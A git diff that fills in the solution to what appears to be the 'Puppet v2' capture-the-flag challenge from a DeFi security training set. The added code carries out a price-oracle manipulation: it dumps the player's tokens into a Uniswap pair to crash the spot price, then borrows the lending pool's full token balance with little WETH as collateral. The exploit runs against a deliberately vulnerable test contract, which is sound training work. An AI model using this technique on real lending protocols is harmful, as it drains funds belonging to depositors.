@@ -82,7 +82,26 @@ describe('[Challenge] Puppet v2', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        // Though this lendingPool uses uniswapv2 library, it is still using the pair's current price
+        // instead of time-averaging it. Thus we can perform an oracle attack to drain the pool.
+
+        // 1. Swap all of user's token to WETH to bring down token/WETH pair price.
+        await token.connect(player).approve(uniswapRouter.address, PLAYER_INITIAL_TOKEN_BALANCE);
+        await uniswapRouter.connect(player).swapExactTokensForTokens(
+            PLAYER_INITIAL_TOKEN_BALANCE,
+            0,
+            [token.address, weth.address],
+            player.address,
+            (await ethers.provider.getBlock('latest')).timestamp * 2
+        );
+
+        // 2. User has close to 20 ETH after spending gas fee on the swapping on uniswap.
+        await weth.connect(player).deposit({value: ethers.utils.parseEther("19.9")});
+
+        // 3. Borrow all of lendingPool's token.
+        const wethRequired = BigInt(await lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE));
+        await weth.connect(player).approve(lendingPool.address, wethRequired)
+        await lendingPool.connect(player).borrow(POOL_INITIAL_TOKEN_BALANCE);
     });
 
     after(async function () {
